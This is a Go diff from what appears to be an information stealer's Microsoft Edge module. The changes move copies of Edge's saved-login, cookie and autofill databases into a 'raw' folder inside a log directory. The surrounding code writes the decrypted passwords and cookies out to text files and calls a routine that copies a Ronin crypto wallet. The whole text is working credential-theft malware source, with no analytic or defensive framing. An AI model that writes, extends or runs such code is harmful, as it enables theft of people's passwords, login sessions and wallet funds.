@@ -22,9 +22,9 @@ func Edge(browserPath, logFolderPath string) {
 		log.Println(err)
 	}
 
-	browserPasswords := getEdgePasswords(browserPath, browserKey)
-	browserCookies := getEdgeCookies(browserPath, browserKey)
-	browserAutofill := getEdgeAutofill(browserPath)
+	browserPasswords := getEdgePasswords(browserPath, logFolderPath, browserKey)
+	browserCookies := getEdgeCookies(browserPath, logFolderPath, browserKey)
+	browserAutofill := getEdgeAutofill(browserPath, logFolderPath)
 
 	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "Edge", "Passwords.txt"), []byte(browserPasswords), 0644)
 	if err != nil {
@@ -45,8 +45,8 @@ func Edge(browserPath, logFolderPath string) {
 	wallets.CopyRoninEdge(browserPath, logFolderPath)
 }
 
-func getEdgePasswords(browserPath string, key []byte) string {
-	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Login Data"), path.Join(browserPath, "Default", "edge_login_data"))
+func getEdgePasswords(browserPath, logFolderPath string, key []byte) string {
+	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Login Data"), path.Join(logFolderPath, "raw", "edge_login_data"))
 	if err != nil {
 		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
 	}
@@ -83,8 +83,8 @@ func getEdgePasswords(browserPath string, key []byte) string {
 	return data
 }
 
-func getEdgeCookies(browserPath string, key []byte) string {
-	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Network", "Cookies"), path.Join(browserPath, "Default", "Network", "edge_cookies"))
+func getEdgeCookies(browserPath, logFolderPath string, key []byte) string {
+	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Network", "Cookies"), path.Join(logFolderPath, "raw", "edge_cookies"))
 	if err != nil {
 		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
 	}
@@ -121,8 +121,8 @@ func getEdgeCookies(browserPath string, key []byte) string {
 	return data
 }
 
-func getEdgeAutofill(browserPath string) string {
-	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Web Data"), path.Join(browserPath, "Default", "edge_web_data"))
+func getEdgeAutofill(browserPath, logFolderPath string) string {
+	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Web Data"), path.Join(logFolderPath, "raw", "edge_web_data"))
 	if err != nil {
 		log.Println(fmt.Sprintf("[EDGE] %s", err.Error()))
 	}
